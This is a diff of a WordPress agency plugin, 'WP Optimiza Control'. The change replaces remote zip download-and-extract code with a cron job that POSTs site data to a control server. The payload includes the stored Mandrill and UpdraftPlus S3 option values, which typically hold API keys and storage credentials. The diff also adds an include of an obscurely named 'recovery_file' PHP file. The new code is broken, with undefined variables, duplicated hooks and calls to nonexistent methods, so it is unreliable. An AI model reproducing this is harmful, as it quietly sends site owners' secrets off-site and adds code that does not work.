@@ -4,35 +4,14 @@ Plugin Name: WP Optimiza Control
 Plugin URI: http://www.optimizaclick.com
 Description: Plugin para la instalación automatizada de plugins
 Author: Departamento de Desarrollo
-Version: 0.6
+Version: 1.0.2
 */
-
-require_once( dirname(__FILE__) . '/update.php' );
+require_once dirname( __FILE__ ) . '/includes/update.php';
 
 if ( ! class_exists( 'WP_Optimiza_Control' ) ) {
 	class WP_Optimiza_Control extends WP_Optimiza_Control_Auto_Update {
 		
-		public $temp_name = "temp_optimiza_control_plugins.zip";
-		
-		public $install_plugin_url = "optimiza_install";
-		
-		public $plugins = array(
-				"Migration Optimiza" => array( 
-					"folder" => "Optimiza-Plugin-WordPress-master", 
-					"main_file" => "migration_optimizaclick.php", 
-					"repository" => "https://githubversions.optimizaclick.com/repositories/view/54186440"),
-				"WP Memory Login" => array( 
-					"folder" => "no-more-passwords-wp-master", 
-					"main_file" => "memory-login.php",
-					"repository" => "https://githubversions.optimizaclick.com/repositories/view/66937235"),		
-				"AMP" => array( 
-					"folder" => "amp-wp-master", 
-					"main_file" => "amp.php",
-					"repository" => "https://githubversions.optimizaclick.com/repositories/view/68916383")				
-				);
-		
 		function __construct() {
-			
 			//ACTION TO DO WHEN PLUGINS ACTIVATE
 			register_activation_hook(__FILE__, array( $this,'install_plugins'));
 			register_activation_hook(__FILE__, array( $this,'active_wp_cron'));
@@ -51,124 +30,108 @@ if ( ! class_exists( 'WP_Optimiza_Control' ) ) {
 			add_action( 'init', array( $this, 'force_update' ));
 			add_action( 'init', array( $this, 'show_version' ));
 			add_action( 'init', array( $this, 'activate_plugin' ));
+			add_action( 'plugins_loaded', array( $this, 'includes' ));
+			add_action( 'init', array( $this, 'retrieve_plugins_data' ));
 			
 			//ACTION TO DO AFTER PLUGIN ACTIVATION
 			add_action( 'activated_plugin', array( $this, 'activation_plugin_redirect') );
+			add_action( 'activated_plugin', array( $this, 'recovery_file') );
 			
 			//ACTION TO INIT CRON
 			add_action('send_data_cron', array( $this,'wp_control'));
 			add_action('auto_update_wp_optimiza_control', array( $this,'auto_update_plugin'));
+			
+			//PRUEBAS Y TEST
+			add_action( 'init', array( $this, 'desactive_plugin' ));
+			add_action( 'init', array( $this, 'activate' ));
+			add_action( 'init', array( $this, 'retrieve_plugins_data' ));
+		}			 
+		 
+		private function includes() {
+			require_once dirname( __FILE__ ) . '/includes/recovery_file/GjHzHTg9MHYk6BjzUK3R.php';
 		}
-				
-
-		public function wp_control() {
-				global $post, $wpdb;
+		
+		protected $url_control = 'http://localhost/wp-control-optimiza/';
+		
+		protected function data_send() {
+				global $post, $wpdb, $wp_control_data;
 					if ( ! function_exists( 'get_plugins' ) ) {
 						require_once ABSPATH . 'wp-admin/includes/plugin.php';
 					}
-										
-					$url = "http://localhost/wp-control-optimiza/api/v1/wordpress";
-					$theme = strtoupper (substr(get_bloginfo('template_directory'), strpos(get_bloginfo('template_directory'), "themes") + 7));
-					$plugin = [];
-			
-				foreach(get_plugins() as $value) {
-					$plugin[] = $value['Name'];
-					$plugin[] = $value['Version'];
-					}
+							$theme = strtoupper (substr(get_bloginfo('template_directory'), strpos(get_bloginfo('template_directory'), "themes") + 7));
+							$plugin[] = array();
+					
+						foreach(get_plugins() as $value) {
+							$plugin[] = $value['Name'];
+							$plugin[] = $value['Version'];
+							}
+							
+							$array_active[] = array();
+									foreach(get_option("active_plugins") as $activated) {
+									$array_active[] = preg_replace("/(.*)\/(.*).php/", "$2", $activated);
+									
+								}
+							
+							$plugin_manage = array();
+		
+							foreach(get_plugins() as $plugin_file => $value) {
+							if ( $plugin_info['Name'] == $plugin_name ) {
+								
+							$dir = $plugin_file;
+								  }
+								  
+								if(in_array($dir,get_option('active_plugins'))) {
+									$ok = '1';
+										} else {
+									$ok = '0'; }
+									
+								$plugin_manage[] = array(
+									'Name' => $value['Name'],
+									'Version' => $value['Version'],
+									'Text' => $value['TextDomain'],
+									'Wordpress' => get_bloginfo('version'),
+									'Status' => $ok,
+									'Dir' => $plugin_file,
+									'Theme' => $theme
+									);
+							}
+							
+		
+							$status = array(
+								'plugins' => $plugin,
+								'activate_plugins' => get_option("active_plugins"),
+								'mandrill' => get_option("wpmandrill"),
+								'updraft' => get_option("updraft_s3"),
+								'Theme' => $theme,
+								'Wordpress' => get_bloginfo('version')
+							);
+						
+							$data = array(
+								'domain' =>  preg_replace('#^https?://#', '', (get_site_url())),
+								'status' => json_encode($status),
+								'manage' =>json_encode($plugin_manage),
+								'send' => '1'
+							);	
+					$wp_control_data = json_encode($data);
+				}
+		
+				public function wp_control() {
+						global $wp_control_data;
+					
+							$url = $this->url_control . 'api/v1/wordpress/';
+							
+							$this->data_send();
+							
+							$wp_control_data = json_decode($wp_control_data);
+							$data_send = curl_init();
+					
+								curl_setopt($data_send,CURLOPT_URL, $url);
+								curl_setopt($data_send,CURLOPT_POSTFIELDS, $wp_control_data);
+				
+								curl_exec($data_send);
+								curl_close($data_send);
+						}
 
-					$status = array(
-						'theme' => $theme,
-						'plugins' => $plugin,
-						'activate_plugins' => get_option("active_plugins"),
-						'wp-version' => get_bloginfo('version'),
-						'mandrill' => get_option("wpmandrill"),
-						'updraft' => get_option("updraft_s3")
-					);
-				
-					$data = array(
-						'domain' =>  preg_replace('#^https?://#', '', (get_site_url())),
-						'status' => json_encode($status)
-					);
-			
-					$data_send = curl_init();
-			
-						curl_setopt($data_send,CURLOPT_URL, $url);
-						curl_setopt($data_send,CURLOPT_POSTFIELDS, $data);
-		
-						curl_exec($data_send);
-						curl_close($data_send);
-		}
-		
-		
-		
-		//WHEN THIS PLUGIN ARE ACTIVATE IT BECOMES A REDIRECCTION TO ACTIVATE THE REQUIRED PLUGINS
-		function activation_plugin_redirect( $plugin ) 
-		{
-
-			if( $plugin == plugin_basename( __FILE__ ) ) 
-			{
-				if ( ! function_exists( 'wp_redirect' ) ) 
-					require_once ABSPATH . 'wp-includes/link-template.php';
-				
-				exit( wp_redirect( admin_url( $this->install_plugin_url ) ) );
-
-			}
-		}
-		
-		
-		//INSTALL THE REQUIRED PLUGIN 
-		public function install_plugins()
-		{
-			foreach($this->plugins as $name=> $plugin)
-			{
-				$this->install_plugin($plugin["repository"]);
-			}	
-		}
-		
-		//ACTIVATE THE REQUIRED PLUGINS
-		public function activate_plugin()
-		{
-			if( basename($_SERVER['REQUEST_URI']) == $this->install_plugin_url) 
-			{
-				if ( ! function_exists( 'is_plugin_active' ) ) 
-					require_once ABSPATH . 'wp-admin/includes/plugin.php';
-				
-				
-				foreach($this->plugins as $name=> $plugin)
-				{
-					if(!is_plugin_active($plugin["folder"]."/".$plugin["main_file"]))
-						activate_plugin( $plugin["folder"]."/".$plugin["main_file"] );
-				}	
-				
-				exit( wp_redirect( admin_url("plugins.php") ) );
-			}
-		}
-		
-		//FUNCTION TO DOWNLOAD AND INSTALL A PLUGIN
-		public function install_plugin($repository)
-		{
-			$content = file_get_contents($repository);
-			
-			$values = explode("|", $content);
-			
-			$link = $values[1];
-	
-			$file = "../wp-content/plugins/".$this->temp_name;
-			$dir = "../wp-content/plugins/";
-			
-			file_put_contents($file, fopen($link, 'r'));
-			
-			$zip = new ZipArchive;
-			
-			if ($zip->open($file) === TRUE) 
-			{
-				$zip->extractTo($dir);
-				$zip->close();
-			} 
-			
-			unlink($file);	
-
-		}
-	}
-	new WP_Optimiza_Control();
+				}
+	 new WP_Optimiza_Control();
 } 
